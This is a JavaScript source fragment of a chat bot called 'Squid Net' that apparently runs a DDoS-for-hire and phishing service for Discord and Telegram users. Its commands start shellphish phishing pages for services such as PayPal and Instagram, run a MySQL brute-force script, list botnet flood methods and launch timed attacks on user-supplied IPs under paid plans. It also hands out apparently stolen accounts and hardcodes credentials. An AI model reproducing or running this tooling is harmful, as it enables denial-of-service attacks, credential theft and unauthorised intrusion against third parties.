        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'bugbounty': {
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');
        var string = `Report exploits and bugs privately for a free plan.\nLow level bug/exploit = 6+ Hours\n\nMid level bug/exploit = 12+ Hours\n\nHigh level bug/exploit = 24+ Hours\n\nSevere level bug/exploit = 48+ Hours`
        var embed = new Discord.MessageEmbed()
          .setTitle("Bug Bounty:")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'phish': {
        if (illegal === "true") {
          break;
        }
        var string = `Deprecated use the logger.`
        if (runningBot == "Discord") {
          message.channel.send(`${string}`)
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
        if (parseInt(row.phish) == 0) {
          message.channel.send("No access.");
          break;
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        if (fs.existsSync(`terminal/${user}phish.txt`)) {
          var string = `You already have one phish running please stop it first\n/phishquit`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        } else {
          var output = execSync(`echo "true" > terminal/${user}phish.txt`, {
            encoding: 'utf-8'
          });
        }
        var output = execSync(`screen -dmS ${user}phish`, {
          encoding: 'utf-8'
        });
        var output = execSync(`screen -S ${user}phish -p 0 -X stuff 'exec $SHELL\n'`, {
          encoding: 'utf-8'
        });
        var output = execSync(`screen -S ${user}phish -p 0 -X stuff 'script -f /root/bot/terminal/${user}phish.txt\n'`, {
          encoding: 'utf-8'
        });
        var output = execSync(`screen -S ${user}phish -p 0 -X stuff 'cd /root/bot/hacks/shellphish/; ./${response}1.sh; pkill -f -2 ngrok > /dev/null 2>&1; killall -2 ngrok > /dev/null 2>&1; pkill php > /dev/null 2>&1; service apache2 restart\n'`, {
          encoding: 'utf-8'
        });
        var string = `run /check or /phishquit to stop`
        if (runningBot == "Discord") {
          message.channel.send(`${string}`)
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'check': {
        if (illegal === "true") {
          break;
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        var exec = require('child_process').exec
        var output = `screen -S ${user}phish -p 0 -X stuff '${response}^M'`;

        function execCB(error, stdout, stderr) {}
        var app = exec(output, execCB);
        var contents = "err";
        sleep(250)
          .then(() => {})
          .then(() => {
            sleep(250)
              .then(() => {
                var output = execSync(`\\cp -rf terminal/${user}phish.txt terminal/${user}phishoutput.txt; ./terminal/clean.sh terminal/${user}phishoutput.txt terminal/${user}phishoutput.txt1; mv terminal/${user}phishoutput.txt1 terminal/${user}phishoutput.txt`, {
                  encoding: 'utf-8'
                });
                var contents = fs.readFileSync(`terminal/${user}phishoutput.txt`, 'utf-8');
                if (contents.length > 1990) {
                  var contents = contents.slice(contents.length - 1990)
                }
                var string = `\`\`\`${contents}\`\`\``
                if (runningBot == "Discord") {
                  message.channel.send(`${string}`)
                } else if (runningBot == "Telegram") {
                  bot.sendMessage(chatId, `${string}`);
                }
              });
          })
        break;
      }
      case 'phishquit': {
        if (illegal === "true") {
          break;
        }
        var string = `Deprecated use the logger.`
        if (runningBot == "Discord") {
          message.channel.send(`${string}`)
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        var response = args.join(' ');
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        var exec = require('child_process').exec

        function countWords(str) {
          str = str.replace(/(^\s*)|(\s*$)/gi, "");
          str = str.replace(/[ ]{2,}/gi, " ");
          str = str.replace(/\n /, "\n");
          return str.split(' ').length;
        }
        var length = countWords(response);
        var minLength = 1
        if (fs.existsSync(`terminal/${user}phish.txt`)) {
          var output = execSync(`screen -ls | grep ${user}phish | cut -d. -f1 | awk '{print $1}' | xargs kill 2> /dev/null;pkill ngrok;pkill php; service apache2 restart`, {
            encoding: 'utf-8'
          });
          fs.unlink(`terminal/${user}phishout.txt`, function(err) {
            if (err && err.code == 'ENOENT') {
              console.info("File doesn't exist, won't remove it.");
            } else if (err) {
              console.error("Error occurred while trying to remove file");
            } else {}

          });
          fs.unlink(`terminal/${user}phish.txt`, function(err) {
            if (err && err.code == 'ENOENT') {
              console.info("File doesn't exist, won't remove it.");
            } else if (err) {
              console.error("Error occurred while trying to remove file");
            } else {}

          });
          var string = `Phising stopped`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        var string = `No phising attack running`
        if (runningBot == "Discord") {
          message.channel.send(`${string}`)
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'phishoptions': {
        if (illegal === "true") {
          break;
        }
        var string = `Deprecated use the logger.`
        if (runningBot == "Discord") {
          message.channel.send(`${string}`)
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        var string = `\`\`\`Instagram || Origin || PayPal\nFacebook || Steam || Playstation\nSnapchat || Yahoo\nTwitter || Linkedin\nGithub || Protonmail\nGoogle || Wordpress\nSpotify || Microsoft\nNetflix || InstaFollowers\nGitlab || Pinterest\`\`\``
        if (runningBot == "Discord") {
          message.channel.send(`${string}`)
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `${string}`);
        }
        break;
      }
      case 'checkip': {
        if (!row.admin == "1") {
          if (illegal === "true") {
            break;
          }
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        var output = execSync(`./checkip.sh ${args} > checkip.txt`, {
          encoding: 'utf-8'
        });
        var output = execSync(`sed -i 's/:/: /g' checkip.txt`, {
          encoding: 'utf-8'
        });
        var filter = execSync(`tr , '\n' < checkip.txt | head -n 25`, {
          encoding: 'utf-8'
        });
        var a = filter.replace("isPublic", "**Public**");
        var b = a.replace("ipVersion", "**Version**");
        var c = b.replace("isWhitelisted", "**Whitelisted**");
        var d = c.replace("abuseConfidenceScore", "**Abuse**");
        var e = d.replace("countryCode", "**Code**");
        var f = e.replace("usageType", "**Type**");
        var g = f.replace("isp", "**ISP**");
        var h = g.replace("domain", "**Domain**");
        var i = h.replace("hostnames", "**Hostnames**");
        var j = i.replace("countryName", "**Country**");
        var k = j.replace("totalReports", "**Reports**");
        var l = k.replace("numDistinctUsers", "**Report Users**");
        var m = l.replace("lastReportedAt", "**Last Report**");
        var n = m.replace("reports", "**Reports**");
        var o = n.replace(/\"/g, "");
        var p = o.replace(/\{/g, "");
        var q = p.replace(/\}/g, "");
        var r = q.replace(/\[/g, "")
        var s = r.replace(/\]/g, "")
        var t = s.replace(":", ": ");
        var tt = t.replace("data: ipAddress", "**IP**")
        var u1 = tt.replace(":", ": ");
        counter = 1
        /*while (counter < 10) {
          var t = u.replace(":", ": ");
            var u = t.replace(":", ": ");
          counter++;
        }*/
        if (u1.includes("abuseConfidenceScore -> 0")) {} else {
          /*zvar output = execSync(`sed -i '$ s/$/,'` + args + `'/' block.txt`, {
            encoding: 'utf-8'
          });*/
        }
        fs.unlink(`checkip.txt`, function(err) {
          if (err && err.code == 'ENOENT') {
            // file doens't exist
            console.info("File doesn't exist, won't remove it.");
          } else if (err) {
            // other errors, e.g. maybe we don't have enough permission
            console.error("Error occurred while trying to remove file");
          } else {}
        });
        var output = execSync(`curl "https://ipfind.co?ip=${args}&auth=5c5fd7f0-e938-4fde-be11-d682c7ed6052" 2>/dev/null > ip.txt`, {
          encoding: 'utf-8'
        });
        var output = execSync(`sed -i 's/:/: /g' ip.txt`, {
          encoding: 'utf-8'
        });
        var filter = execSync(`tr , '\n' < ip.txt`, {
          encoding: 'utf-8'
        });
        var a = filter.replace("country", "**Country**");
        var b = a.replace("country_code", "**Country Code**");
        var c = b.replace("continent", "**Continent**");
        var d = c.replace("continent_code", "**Continent Code**");
        var e = d.replace("city", "**City**");
        var f = e.replace("county", "**County**");
        var g = f.replace("region", "**Region**");
        var h = g.replace("region_code", "**Region Code**");
        var i = h.replace("timezone", "**Timezone**");
        var j = i.replace("owner", "**Owner**");
        var k = j.replace("longitude", "**Longitude**");
        var l = k.replace("latitude", "**Latitude**");
        var m = l.replace("currency", "**Currency**");
        var n = m.replace("languages", "**Languages**");
        var o = n.replace(/\"/g, "");
        var p = o.replace(/\{/g, "");
        var q = p.replace(/\}/g, "");
        var r = q.replace(/\[/g, "")
        var s = r.replace(/\]/g, "")
        var t = s.replace(":", ": ");
        var tt = t.replace("ip_address", "**IP**")
        var u = tt.replace(":", ": ");
        counter = 1
        while (counter < 10) {
          /*var t = u.replace(":", ": ");
          var u = t.replace(":", ": ");*/
          counter++;
        }
        var string = `${u1}\n${u}`
        var embed = new Discord.MessageEmbed()
          .setTitle("IP Checker:")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, ``);
        }
        fs.unlink(`ip.txt`, function(err) {
          if (err && err.code == 'ENOENT') {
            console.info("File doesn't exist, won't remove it.");
          } else if (err) {
            console.error("Error occurred while trying to remove file");
          } else {}
        });
        break;
      }
      case 'brute': {
        if (illegal === "true") {
          break;
        }
        if (runningBot == "Discord") {
          if (!ddosenabledservers.includes(`${guildID}`)) {
            return;
          }
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        var output = execSync(`timeout 5 bash mysqlbrute.sh passfile ${args} &>/dev/null`, {
          encoding: 'utf-8'
        });
        var string = `${output}`
        var embed = new Discord.MessageEmbed()
          .setTitle("Mirai Bruter:")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, ``);
        }
        break;
      }
      case 'accounts': {
        if (illegal === "true") {
          break;
        }
        var string = `**These are free please dont complain about them**\n**/vpn**\n**/hulu**\n**/steamcode**\n**/xboxcode**\n**/mega** - Mega.nz`
        var embed = new Discord.MessageEmbed()
          .setTitle("Accounts:")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, ``);
        }
        break;
      }
      case 'methods': {
        if (illegal === "true") {
          break;
        }
        if (runningBot == "Discord") {
          if (guild) {
            if (!ddosenabledservers.includes(`${guildID}`)) {
              return;
            }
          }
        }
        /*var string = `https://media.discordapp.net/attachments/726141040230137976/747895542931128390/SquidNetMethods_Rev005.png?width=1095&height=684`*/
        var embed = new Discord.MessageEmbed()
          .setColor(0x089FEF)
          .setTitle('Methods')
          .setDescription('__**LAYER 4**__ : /peen {server} {method} {ip} {time} {port}\n__**LAYER 7**__ : /peen kraken http {ip} {time} domain=IP conns=5000')
          .addFields({
            name: '__**kraken**__',
            value: '**squid**\n**udp**\n**ovh**\n**vse**\n**syn**\n**ack**\n**stdhex**\n**udp**',
            inline: true
          },
          {
            name: '__**backup1**__',
            value: '**udp**\n**stdhex**\n**udpgame**\n**vse**\n**synhome**\n**syn**\n**frag**\n**tcpall**\n**xmas**\n**stomp**\n**greip**\n**greeth**\n**tcphex**\n**vsehex**\n**udpbypass**\n**ovh**\n**ovhudp**',
            inline: true
          },)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send(embed)
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `__LAYER 4__ : /peen {server} {method} {ip} {time} {port}__LAYER 7__ : /peen kraken http {ip} {time} domain=IP conns=5000\n\n**udp**\n**ovh**\n**vse**\n**syn**\n**ack**\n**stdhex**\n**udpplain**\n**http**`);
        }
        break;
      }
      case 'checkservers': {
        if (illegal === "true") {
          break;
        }
        if (runningBot == "Discord") {
          if (!ddosenabledservers.includes(`${guildID}`)) {
            return;
          }
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        var output1 = execSync(`timeout 1 nc -zv 193.228.91.124 65535 > checking.txt 2>&1`, {
          encoding: 'utf-8'
        });
        var contents = fs.readFileSync(`checking.txt`, 'utf-8')
        if (contents.includes("succeeded")) {
          var kraken = "All Servers Are Online"
        } else {
          var kraken = "All Servers Are Offline"
        }
        var string = `**${kraken}**`
        var embed = new Discord.MessageEmbed()
          .setTitle("Checking Servers:")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, ``);
        }
        break;
      }
      case 'serverinfo': {
        if (illegal === "true") {
          break;
        }
        if (runningBot == "Discord") {
          if (!ddosenabledservers.includes(`${guildID}`)) {
            return;
          }
        }
        var response = args.join(' ');
        var execSync = require('child_process').execSync;
        var string = `kraken: main server`
        var embed = new Discord.MessageEmbed()
          .setTitle("Server Info:")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, ``);
        }
        break;
      }
      case 'getbots': {
        if (illegal === "true") {
          break;
        }
        if (parseInt(row.admin) == 0) {
          break;
        }
          message.channel.send("Getting Bot Info");
          var execSync = require('child_process').execSync;
          execSync(`timeout 10 ./runattack.sh spongebob bots | tee check.txt`, {
            encoding: 'utf-8'
          }); // the default is 'buffer'
          execSync(`sh clean.sh`, {
            encoding: 'utf-8'
          }); // the default is 'buffer'
          var contents2 = fs.readFileSync(`bots.txt`, 'utf-8')
          var string = `\`\`\`yaml\n${contents2}\`\`\``
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
        break;
      }
      case 'running': {
        if (illegal === "true") {
          break;
        }
        if (parseInt(row.admin) == 0) {
          break;
        }
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `Discord Only`);
          return;
        }
        let users = []
        var response = args.join(' ');
        var method = "err";
        var execSync = require('child_process').execSync;
        var con = mysql.createConnection({
          host: "localhost",
          user: "root",
          password: "fuckingpeopleover",
          timeout: 6000000,
          database: "bot"
        });
        console.log(messageTime)
        con.query(`select * from history where ends > "${messageTime}"`, (err, rows) => {
          if (err) throw err;
          var cnt = rows.length
          var i = 0
          console.log(i, "/", cnt)
          rows.forEach((row) => {
            console.log(i, "/", cnt)
            console.log(row.ends)
            var d = 0
            var h = 0
            var m = 0
            var s = 0
            var parsed = parseInt(row.ends) - parseInt(messageTime);
            var h = Math.floor(parseFloat(`${parsed}`) / 1000 / 60 / 60);
            var m = Math.floor((parseFloat(`${parsed}`) / 1000 / 60 / 60 - h) * 60);
            var s = Math.floor(((parseFloat(`${parsed}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
            if (h < 24) {
              var d = 0
            } else {
              var d = parseInt(h / 24)
              var h = h % 24;
            }
            users.push(`<@${row.user}> CMD: **${row.command}**\nTime Left: **Hr:** ${h} **Min:** ${m} **Sec:** ${s}\n\n`);
            i++;
            if (i == parseInt(cnt)) {
              var string = `${users}`
              var embed = new Discord.MessageEmbed()
                .setTitle(`Running Attacks: ${cnt}`)
                .setAuthor("Squid Net")
                .setColor(0x089FEF)
                .setDescription(`${string}`)
                .setTimestamp()
              if (runningBot == "Discord") {
                message.channel.send({
                  embed
                })
              } else if (runningBot == "Telegram") {
                bot.sendMessage(chatId, `${string}`);
              }
              return;
            }
          });
          if (rows.length < 1) {
            var string = "None"
            var embed = new Discord.MessageEmbed()
              .setTitle("Running Attacks:")
              .setAuthor("Squid Net")
              .setColor(0x089FEF)
              .setDescription(`${string}`)
              .setTimestamp()
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
          }
        });
        break;
      }
      case 'getlog': {
        if (illegal === "true") {
          break;
        }
        if (runningBot == "Telegram") {
          bot.sendMessage(chatId, `Discord Only For Now`);
          break;
        }
        if (!parseInt(row.admin) == 1) {
          message.channel.send({
            files: [`users/${user}cmd.log`]
          });
          break;
        }
        if (fs.existsSync(`users/${args}cmd.log`)) {
          message.channel.send({
            files: [`users/${args}cmd.log`]
          });
          break;
        } else {
          message.channel.send("Log not found")
          break;
        }
        break;
      }
      case 'captcha': {
        if (illegal === "true") {
          break;
        }
        var a = Math.floor(Math.random() * 100) + 1;
        var b = Math.floor(Math.random() * 100) + 1;
        var c = parseInt(a) + parseInt(b);
        var answer = '';
        var option = '';
        var [option, answer] = args.toString().toLowerCase().split(",");
        if (parseInt(row.verified) == 1) {
          var string = `You have already been verified!`
          var embed = new Discord.MessageEmbed()
            .setTitle("Captcha v0.2:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, ``);
          }
          break;
        }
        if (option == "reset") {
          var string = `What is: ${a} + ${b}`
          var embed = new Discord.MessageEmbed()
            .setTitle("Captcha v0.2:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, ``);
          }
          var execSync = require('child_process').execSync;
          sql = `UPDATE user SET captchaAnswer ="${c}" WHERE id ="${user}"`;
          con.query(sql)
          break;
        }
        if (option == "answer") {
          con.query(`SELECT * FROM user WHERE id ="${user}"`, (err, rows) => {
            if (err) throw err;
            rows.forEach((row) => {
              if (answer == row.captchaAnswer) {
                sql = `UPDATE user SET verified = '1' WHERE id = '${user}'`;
                con.query(sql)
                var string = `You have been verified!`
                var embed = new Discord.MessageEmbed()
                  .setTitle("Captcha v0.2:")
                  .setAuthor("Squid Net")
                  .setColor(0x089FEF)
                  .setDescription(`${string}`)
                  .setTimestamp()
                if (runningBot == "Discord") {
                  message.channel.send({
                    embed
                  })
                } else if (runningBot == "Telegram") {
                  bot.sendMessage(chatId, ``);
                }
              } else {
                var string = `Invalid Captcha`
                var embed = new Discord.MessageEmbed()
                  .setTitle("Captcha v0.2:")
                  .setAuthor("Squid Net")
                  .setColor(0x089FEF)
                  .setDescription(`${string}`)
                  .setTimestamp()
                if (runningBot == "Discord") {
                  message.channel.send({
                    embed
                  })
                } else if (runningBot == "Telegram") {
                  bot.sendMessage(chatId, ``);
                }
              }
            })
          });
          /*if (guild) {
            if (message.member.roles.cache.some(r => ["Muted"].includes(r.name))) {
              member.roles.remove(rolePlatinum).catch(console.error);
            }
          }*/
          break;
        }
        var string = `**/captcha reset** - Start a new verification proccess\n**/captcha answer {answer}** - Give the answer to your captcha\n\nExample: /captcha answer 84`
        var embed = new Discord.MessageEmbed()
          .setTitle("Captcha v0.2:")
          .setAuthor("Squid Net")
          .setColor(0x089FEF)
          .setDescription(`${string}`)
          .setTimestamp()
        if (runningBot == "Discord") {
          message.channel.send({
            embed
          })
        } else if (runningBot == "Telegram") {
          bot.sendMessage(chatId, ``);
        }

        break;
      }
      case 'peen': {
        if (illegal === "true") {
          break;
        }
        if (runningBot == "Discord") {
          if (guild) {
            if (!ddosenabledservers.includes(`${guildID}`)) {
              return;
            }
          }
        }
        var execSync = require('child_process').execSync;
        if (parseInt(row.verified) == 0) {
          var string = `Please Complete the Security Captcha to Use This! /captcha`
          var embed = new Discord.MessageEmbed()
            .setTitle("Captcha v0.2:")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, ``);
          }
          break;
        }
        if (parseInt(row.globalCooldown) > parseInt(messageTime)) {
          var h = 00
          var m = 00
          var s = 00
          var d = 00
          var h = Math.floor(parseFloat(`${parseInt(row.globalCooldown) - parseInt(messageTime)}`) / 1000 / 60 / 60);
          var m = Math.floor((parseFloat(`${parseInt(row.globalCooldown) - parseInt(messageTime)}`) / 1000 / 60 / 60 - h) * 60);
          var s = Math.floor(((parseFloat(`${parseInt(row.globalCooldown) - parseInt(messageTime)}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
          if (h < 24) {
            var d = 0
          } else {
            var d = parseInt(h / 24)
            var h = h % 24;
          }
          var string = `**Your access has been put on a timeout for breaking one of our rules.**\nFor more information or to open an appeal open a ticket.\n\nYou can use this again in: **Days:** ${d} **Hours:** ${h} **Min:** ${m} **Sec:** ${s}`
          var embed = new Discord.MessageEmbed()
            .setTitle("")
            .setAuthor("Squid Net")
            .setColor(0x089FEF)
            .setDescription(`${string}`)
            .setTimestamp()
          if (runningBot == "Discord") {
            message.channel.send({
              embed
            })
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, ``);
          }
          break;
        }
        var response = args.join(' ');

        function countWords(str) {
          str = str.replace(/(^\s*)|(\s*$)/gi, "");
          str = str.replace(/[ ]{2,}/gi, " ");
          str = str.replace(/\n /, "\n");
          return str.split(' ').length;
        }
        var length = countWords(response);
        if (length < minLength) {
          var string = `\n-------------------------------------------\n/peen {server} {method} {ip} {length} {port}\n-------------------------------------------`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        var server = "err";
        var method = "err";
        var ip = "err";
        var time = "err";
        var dport = "80";
        var http = " ";
        var l6 = '';
        var l7 = '';
        var [server, method, ip, time, dport, http, l6, l7] = args.toString().toLowerCase().split(",");
        var rtime = time * 1000;
        if (!availableservers.includes(`${server}`)) {
          var string = `You ${server} isnt an available server.\nDo /serverinfo for more information and a list of available servers`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (server == "godzilla") {
          if (!godmethods.includes(`${method}`)) {
            var string = `${method} isnt a method do **/methods**`
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
        } else if (server == "kraken") {
          if (!methods.includes(`${method}`)) {
            var string = `${method} isnt a method do **/methods**`
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
        } else if (server == "spongebob") {
          if (!spongemethods.includes(`${method}`)) {
            var string = `${method} isnt a method do **/methods**`
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
        } else if (server == "backup1") {
          if (!backup1methods.includes(`${method}`)) {
            var string = `${method} isnt a method do **/methods**`
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
        }
        if (!ip.match(/\b(?:(?:2(?:[0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9])\.){3}(?:(?:2([0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9]))\b/ig)) {
          var string = `Invalid IP`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (isNaN(parseInt(time))) {
          var string = `Invalid Time`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (l6 == null) {
          var l6 = " ";
        }
        if (l7 == null) {
          var l7 = " ";
        }
        if (dport == null) {
          var dport = "dport=80"
          var port = "80"
        } else {
          if (dport.includes("dport")) {
            var port = dport.slice(6);
          }
          if (!dport.includes("dport=")) {
            var port = dport;
            var dport = `dport=${port}`
            if (method.includes("http")) {
              var dport = `${port}`
            } else {
              var dport = `dport=${port}`
            }
          }
        }
        if (http == null) {
          var http = " "
          var http1 = "undefined"
        }
        if (time == null) {
          var string = `Length Not Specified`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        var execSync = require('child_process').execSync;
        /*var output = execSync(`curl -s "193.228.91.123/iplookup.php?ip=${ip}" 2>&1`, {
          encoding: 'utf-8'
        });*/
        var output = "";
        if (output.includes(".gov")) {
          var string = `Blacklisted`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (output.includes(".edu")) {
          var string = `Blacklisted`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (output.includes("fbi")) {
          var string = `Blacklisted`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (output.includes("Google")) {
          var string = `Blacklisted`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (output.includes("Hosting")) {
          if (Number(time) > 120) {
            var string = `Server Detected: 120 Limit`
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
        }
        if (output.includes("ovh")) {
          if (Number(time) > 120) {
            var string = `OVH Detected: 120 Limit`
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
        }
        if (output.includes("nfo.")) {
          if (Number(time) > 120) {
            var string = `NFO Detected: 120 Limit`
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
        }
        if (method.includes("squid")) {
          var method1 = "squid"
          var method = "stdhex"
        } else {
          var method1 = method
        }
        if (server == "godzilla") {
          if (parseInt(time) > 120) {
            var string = `120 Limit`
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
          if (Number(row.godzillaCooldown) > Number(messageTime)) {
            var string = `Please wait intill your current godzilla attack is over`
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
        }
        if (Number(row.spongeCooldown) > Number(messageTime)) {
          var string = `Please wait intill your current spongebob attack is over`
          if (runningBot == "Discord") {
            message.channel.send(`${string}`)
          } else if (runningBot == "Telegram") {
            bot.sendMessage(chatId, `${string}`);
          }
          break;
        }
        if (server == "godzilla") {
          if (Number(time) > Number(maxHitLimit)) {
            var string = `Your time limit is ${maxHitLimit}`
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
        } else if (server == "spongebob") {
          if (Number(time) > Number(spongeHitLimit)) {
            var string = `Your time limit is ${spongeHitLimit}`
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
        } else {
          if (Number(time) > Number(maxHitLimit)) {
            var string = `Your time limit is ${maxHitLimit}`
            if (runningBot == "Discord") {
              message.channel.send(`${string}`)
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
        }
        if (plan === "No Plan") {
          if (row.freeAttackCooldown > Number(messageTime)) {
            var a1 = parseInt(`${row.freeAttackCooldown}`) - parseInt(`${messageTime}`)
            var h = 00
            var m = 00
            var s = 00
            var d = 00
            var h = Math.floor(parseInt(`${a1}`) / 1000 / 60 / 60);
            var m = Math.floor((parseInt(`${a1}`) / 1000 / 60 / 60 - h) * 60);
            var s = Math.floor(((parseInt(`${a1}`) / 1000 / 60 / 60 - h) * 60 - m) * 60);
            if (h < 24) {
              var d = 0
            } else {
              var d = parseInt(h / 24)
              var h = h % 24;
            }
            var string = `**Days:** ${d} **Hours:** ${h} **Min:** ${m} **Sec:** ${s}\n Buy a plan to get longer hit times and too remove cooldowns!`
            var embed = new Discord.MessageEmbed()
              .setTitle("You can use this again in:")
              .setAuthor("Squid Net")
              .setColor(0x089FEF)
              .setDescription(`${string}`)
              .setTimestamp()
            if (runningBot == "Discord") {
              message.channel.send({
                embed
              })
            } else if (runningBot == "Telegram") {
              bot.sendMessage(chatId, `${string}`);
            }
            break;
          }
          var conexpire = 86400000 + Number(messageTime);
          sql = `UPDATE user SET freeAttackCooldown ="${conexpire}" WHERE id ="${user}"`;
          con.query(sql)
        }
        sql = `UPDATE user SET lastAttack ="${messageTime}" WHERE id ="${user}"`;
        con.query(sql)

        var exec = require('child_process').exec;
        if (cooled == true) {
          break;
        }
        if (method.includes("annihilate")) {
